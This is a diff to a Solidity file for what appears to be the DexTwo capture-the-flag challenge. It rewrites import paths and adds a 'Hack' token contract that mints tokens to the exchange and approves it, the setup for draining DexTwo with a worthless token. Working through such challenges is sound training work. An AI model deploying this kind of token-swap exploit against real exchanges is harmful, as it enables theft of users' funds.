@@ -1,9 +1,9 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
-import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
-import "openzeppelin-contracts-08/access/Ownable.sol";
+import "../../../node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "../../../node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "../../node_modules/@openzeppelin/contracts/access/Ownable.sol";
 
 contract DexTwo is Ownable {
     address public token1;
@@ -67,6 +67,29 @@ contract SwappableTokenTwo is ERC20 {
     ) ERC20(name, symbol) {
         _mint(msg.sender, initialSupply);
         _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+}
+
+contract Hack is ERC20 {
+    address private _dex;
+    address public player;
+
+    constructor(
+        address dexInstance,
+        string memory name,
+        string memory symbol,
+        uint initialSupply
+    ) ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+        player = msg.sender;
+        _mint(dexInstance, 100);
+        approve(dexInstance, 100);
     }
 
     function approve(address owner, address spender, uint256 amount) public {
